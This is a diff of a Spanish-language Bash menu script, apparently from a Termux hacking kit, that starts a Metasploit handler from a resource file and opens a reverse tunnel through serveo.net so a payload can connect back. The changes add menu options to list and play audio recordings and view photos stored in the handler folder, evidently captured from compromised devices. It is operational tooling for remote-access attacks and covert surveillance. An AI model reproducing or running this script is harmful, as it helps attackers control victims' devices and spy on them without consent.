@@ -22,6 +22,8 @@ printf "$Y 3 OPCIONES PARA UTILIZAR (2) SESSIONES $C
 2)$G  ACTIVAR SERVIDOR SERVEO PARA CONEXION (2 SESSION)... $C
 3) $G MANUAL HACKING BASICO DE MESTASPLOIT.... $C
 4) $G LLAMAR A FT PARA OPCIONES HACKING $C
+5) $G ESCUCHAR AUDIOS GRABADOS $C
+6) $G VER FOTOS TOMADAS $C
 0)$R  Salir....$G
 "
 read -p " >>> " op
@@ -34,7 +36,12 @@ case $op in
 			sleep 5
 		printf "$Y ADVERTENCIA!!! ESPERA QUE INICIE COMPLETO LUEGO USA LA OPCION 2 EN OTRA SESSION!!!\n$G"
 		echo
-		cd java/handler && msfconsole -r *rc*
+		cd $HOME/java/handler && msfconsole -r *rc*
+		reiniciar
+	elif [ -e ~/$HOME/FastTools/.CONFIG/*rc* ]; then
+		printf "$G ENCONTRADO EN FT \n"
+		sleep 5
+		msfconsole -r FastTools/.CONFIG/*rc*
 		reiniciar
 	else
 		echo
@@ -48,11 +55,39 @@ case $op in
 	2)
 		echo
 		printf "$G ABRIENDO PUERTAS ESCUCHANTE DEL PAYLOAD\n"
-		autossh -M 0 -R 7728:127.0.0.1:7767 serveo.net
+		autossh -M 0 -R 25550:127.0.0.1:4546 serveo.net
+		reiniciar
+		;;
+	3)
+		bash $HOME/Bot-MSF-Serveo/manual
+		echo
+		printf " ENTER/ENVIAR PARA VOLVER\n"
+		read
 		reiniciar
 		;;
 	4)
 		FT
+		reiniciar
+		;;
+	5)
+		printf "$R"
+		echo
+		cd $HOME/java/handler && ls *wav*
+		echo
+		printf "$G"
+		read -p "COPIA Y PEGA EL AUDIO GRABADO PARA REPRODUCIR >> " o
+		termux-open $o
+		reiniciar
+		;;
+	6)
+		printf "$R"
+		echo
+		cd $HOME/java/handler && ls *jpeg*
+		echo
+		printf "$G"
+		read -p " COPIA Y PEGA EL NOMBRE DE LA IMAGEN QUE APARECE ARRIBA >> " h
+		echo
+		termux-open $h
 		reiniciar
 		;;
 	0)
